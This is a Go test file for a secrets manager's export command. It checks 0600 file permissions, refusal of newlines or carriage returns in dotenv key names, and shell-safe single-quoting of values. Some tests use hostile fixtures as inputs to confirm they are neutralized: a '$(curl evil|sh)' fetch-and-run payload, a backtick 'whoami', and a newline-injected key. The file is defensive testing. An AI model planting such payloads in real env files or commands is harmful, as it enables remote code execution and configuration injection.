package secret

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/spf13/cobra"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestRunExport_OutputFilePermissions guards #353: the plaintext export file
// must be created with 0600, like every sibling writer in this package
// (render.go, scan.go, fix.go), not the default os.Create mode.
func TestRunExport_OutputFilePermissions(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX file-permission bits don't apply on windows")
	}

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.URL.Path == "/api/v1/projects":
			_, _ = w.Write([]byte(`{"data":{"projects":[{"id":1,"name":"default"}]}}`))
		case r.URL.Path == "/api/v1/projects/1/environments":
			_, _ = w.Write([]byte(`{"data":{"environments":[{"id":1,"name":"development"}]}}`))
		case strings.HasPrefix(r.URL.Path, "/api/v1/secrets") && r.URL.Query().Get("project_id") != "":
			_, _ = w.Write([]byte(`{"data":{"secrets":[{"id":9,"name":"DB_PASSWORD"}]}}`))
		case r.URL.Path == "/api/v1/secrets/9":
			_, _ = w.Write([]byte(`{"data":{"value":"s3cr3t"}}`))
		default:
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	defer srv.Close()

	t.Setenv("KEYORIX_SERVER", srv.URL)
	t.Setenv("KEYORIX_TOKEN", "test-token")

	dir := t.TempDir()
	outPath := filepath.Join(dir, "secrets.env")

	origFormat, origOutput, origEnv, origProject := exportFormat, exportOutput, exportEnv, exportProject
	exportFormat = "dotenv"
	exportOutput = outPath
	exportEnv = "development"
	exportProject = "default"
	defer func() {
		exportFormat, exportOutput, exportEnv, exportProject = origFormat, origOutput, origEnv, origProject
	}()

	cmd := &cobra.Command{}
	cmd.SetContext(context.Background())
	require.NoError(t, runExport(cmd, nil))

	info, err := os.Stat(outPath)
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0600), info.Mode().Perm(), "export output file must be created with 0600")

	data, err := os.ReadFile(outPath) // #nosec G304 -- test-controlled path
	require.NoError(t, err)
	assert.Contains(t, string(data), "DB_PASSWORD=s3cr3t")
}

// #384: writeDotenv quote-escapes the VALUE but historically emitted the NAME raw —
// a secret named "FOO\nINJECTED=evil" would inject an extra, attacker-controlled
// KEY=VALUE line into dotenv export output (a documented workflow feeding
// `docker run --env-file`/CI `--env-file`, both of which treat the file as fully
// trusted). Since dotenv has no native way to escape a newline inside a key, the
// export must refuse rather than silently emit an unsafe file.
func TestWriteDotenv_RejectsNewlineInSecretName(t *testing.T) {
	var buf bytes.Buffer
	secrets := []exportedSecret{
		{ID: 1, Name: "SAFE_KEY", Value: "safe-value"},
		{ID: 2, Name: "FOO\nINJECTED=evil", Value: "x"},
	}
	err := writeDotenv(&buf, secrets)
	require.Error(t, err, "a secret name containing a newline must be refused")
	assert.Contains(t, err.Error(), "newline")
	// Nothing must have been written to the output on the failure path — a partial
	// dotenv file is itself a hazard if a caller doesn't check the error.
	assert.Empty(t, buf.String(), "no output should be written when the export is refused")
}

// A secret name containing a carriage return is equally dangerous (CRLF injection)
// and must be refused the same way.
func TestWriteDotenv_RejectsCarriageReturnInSecretName(t *testing.T) {
	var buf bytes.Buffer
	secrets := []exportedSecret{{ID: 1, Name: "FOO\rINJECTED=evil", Value: "x"}}
	err := writeDotenv(&buf, secrets)
	require.Error(t, err, "a secret name containing a carriage return must be refused")
}

// The ordinary case — no newline in any name — must still produce the expected
// KEY=VALUE lines, with the value single-quote-escaped (not double-quoted — see
// writeDotenv's doc comment for why).
func TestWriteDotenv_NormalNamesUnaffected(t *testing.T) {
	var buf bytes.Buffer
	secrets := []exportedSecret{
		{ID: 1, Name: "DB_PASSWORD", Value: "hello world"},
		{ID: 2, Name: "API_KEY", Value: "plain"},
	}
	require.NoError(t, writeDotenv(&buf, secrets))
	out := buf.String()
	assert.Contains(t, out, `DB_PASSWORD='hello world'`)
	assert.Contains(t, out, "API_KEY=plain")
}

// #G-followup: a value containing a command-substitution payload must be
// single-quoted, which suppresses $()/backtick expansion entirely — unlike the
// previous double-quoting, which did NOT suppress it, so a value like
// `$(curl evil|sh)` survived unneutralized into the exported file and would
// execute if a caller later sourced it as documented (e.g. `set -a && . .env
// && set +a`). Mirrors integrations/github-action/entrypoint.sh's
// write_output_file, which was fixed for the identical gap
// (adversarial-review integrations-github-action.json#2).
func TestWriteDotenv_NeutralizesCommandSubstitution(t *testing.T) {
	var buf bytes.Buffer
	secrets := []exportedSecret{
		{ID: 1, Name: "PAYLOAD", Value: "$(curl evil|sh)"},
		{ID: 2, Name: "BACKTICK", Value: "`whoami`"},
	}
	require.NoError(t, writeDotenv(&buf, secrets))
	out := buf.String()
	assert.Contains(t, out, `PAYLOAD='$(curl evil|sh)'`)
	assert.Contains(t, out, "BACKTICK='`whoami`'")

	// Prove the neutralization actually holds under a real shell: source the
	// file and confirm PAYLOAD/BACKTICK end up as the literal strings, not
	// executed — the exact scenario this fix closes.
	dir := t.TempDir()
	envFile := filepath.Join(dir, "test.env")
	require.NoError(t, os.WriteFile(envFile, buf.Bytes(), 0o600))
	script := fmt.Sprintf("set -a; . %q; set +a; printf '%%s\\n%%s\\n' \"$PAYLOAD\" \"$BACKTICK\"", envFile)
	cmdOut, err := exec.Command("bash", "-c", script).CombinedOutput() // #nosec G204 -- test-controlled fixed script string
	require.NoError(t, err)
	assert.Equal(t, "$(curl evil|sh)\n`whoami`\n", string(cmdOut),
		"sourcing the exported file must yield the literal payload strings, not execute them")
}

// A value made entirely of the plain-safe allowlist charset is left unquoted,
// matching write_output_file's identical optimization.
func TestWriteDotenv_PlainSafeValueUnquoted(t *testing.T) {
	var buf bytes.Buffer
	secrets := []exportedSecret{{ID: 1, Name: "URL", Value: "https://example.com/a/b_c.d-e:f@g+1,2"}}
	require.NoError(t, writeDotenv(&buf, secrets))
	assert.Contains(t, buf.String(), "URL=https://example.com/a/b_c.d-e:f@g+1,2\n")
}

// A value containing a literal single quote must have it escaped via the
// close-escape-reopen idiom, not left to terminate the quoted string early.
func TestWriteDotenv_EscapesEmbeddedSingleQuote(t *testing.T) {
	var buf bytes.Buffer
	secrets := []exportedSecret{{ID: 1, Name: "K", Value: "it's a secret"}}
	require.NoError(t, writeDotenv(&buf, secrets))
	assert.Contains(t, buf.String(), `K='it'\''s a secret'`)
}

// TestWriteSecrets_JSONFormat verifies that writeSecrets dispatches to JSON correctly.
func TestWriteSecrets_JSONFormat(t *testing.T) {
	var buf bytes.Buffer
	secrets := []exportedSecret{{ID: 1, Name: "KEY", Value: "val"}}
	require.NoError(t, writeSecrets(&buf, "json", secrets, "", ""))
	assert.Contains(t, buf.String(), `"KEY"`)
}

// TestWriteSecrets_VaultFormat verifies that writeSecrets dispatches to Vault YAML correctly.
func TestWriteSecrets_VaultFormat(t *testing.T) {
	var buf bytes.Buffer
	secrets := []exportedSecret{{ID: 2, Name: "DB_PASS", Value: "secret"}}
	require.NoError(t, writeSecrets(&buf, "vault", secrets, "", "production"))
	assert.Contains(t, buf.String(), "DB_PASS")
}

// TestWriteSecrets_EncryptedJSON_NoKey verifies that an empty --encrypt-for returns an error.
func TestWriteSecrets_EncryptedJSON_NoKey(t *testing.T) {
	var buf bytes.Buffer
	err := writeSecrets(&buf, "encrypted-json", nil, "", "")
	require.Error(t, err)
	assert.Contains(t, err.Error(), "--encrypt-for")
}

// TestWriteSecrets_UnknownFormat verifies that an unknown format returns an error.
func TestWriteSecrets_UnknownFormat(t *testing.T) {
	var buf bytes.Buffer
	err := writeSecrets(&buf, "toml", nil, "", "")
	require.Error(t, err)
	assert.Contains(t, err.Error(), "unknown format")
}
